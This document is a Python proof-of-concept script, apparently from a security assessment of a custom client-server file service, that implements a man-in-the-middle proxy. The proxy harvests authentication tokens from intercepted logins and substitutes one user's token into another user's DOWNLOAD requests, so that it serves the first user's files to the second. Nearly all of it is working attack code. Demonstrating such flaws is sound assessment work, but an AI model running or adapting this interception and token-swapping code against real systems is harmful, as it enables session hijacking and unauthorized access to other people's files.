#!/usr/bin/env python3
"""
mitm_F11.py - Cross-User File Access via Token Substitution
Finding: F-11
Violated: R1, R7
The MITM collects tokens from multiple users. When user B performs a
DOWNLOAD, the MITM swaps in user A's token, causing the server to
return files from user A's directory to user B's session.
Demonstrates that tokens are the only access control boundary and
are completely unprotected in transit.
"""

import socket
import threading
import json

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9000
SERVER_HOST  = "10.0.0.3"
SERVER_PORT  = 9000

# Map username -> token as users log in
user_tokens = {}
last_user = {}   # conn_id -> username


def forward(src, dst, label, conn_id, transform=None):
    buf = b""
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                try:
                    obj = json.loads(line.decode("utf-8"))
                    if transform:
                        obj = transform(obj, label, conn_id)
                    line = json.dumps(obj).encode("utf-8")
                except Exception:
                    pass
                dst.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def tamper(obj, label, conn_id):
    # Track logins
    if label == "C->S" and obj.get("action") == "AUTH":
        last_user[conn_id] = obj.get("username")

    # Store tokens as they are issued
    if label == "S->C" and obj.get("status") == "ok" and "token" in obj:
        token = obj["token"]
        if token != "account created":
            uname = last_user.get(conn_id)
            if uname:
                user_tokens[uname] = token
                print(f"[F-11] Stored token for '{uname}': {token}")

    # On DOWNLOAD: substitute a different user's token
    if label == "C->S" and obj.get("action") == "DOWNLOAD":
        current_token = obj.get("token", "")
        # Find whose token this is
        current_user = next((u for u, t in user_tokens.items() if t == current_token), None)
        # Find a different user's token
        victim_token = next(
            (t for u, t in user_tokens.items() if u != current_user),
            None
        )
        if victim_token:
            victim_user = next(u for u, t in user_tokens.items() if t == victim_token)
            obj["token"] = victim_token
            print(f"\n[F-11 SWAP] DOWNLOAD token swapped: '{current_user}' -> '{victim_user}'")
            print(f"  Server will serve files from '{victim_user}' directory\n")

    return obj


def handle_connection(client_sock, client_addr):
    conn_id = id(client_sock)
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print(f"[MITM] Cannot connect to server: {e}")
        client_sock.close()
        return

    t1 = threading.Thread(target=forward, args=(client_sock, server_sock, "C->S", conn_id, tamper), daemon=True)
    t2 = threading.Thread(target=forward, args=(server_sock, client_sock, "S->C", conn_id, tamper), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[F-11] Cross-user token swap active — connect two clients to demonstrate...")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
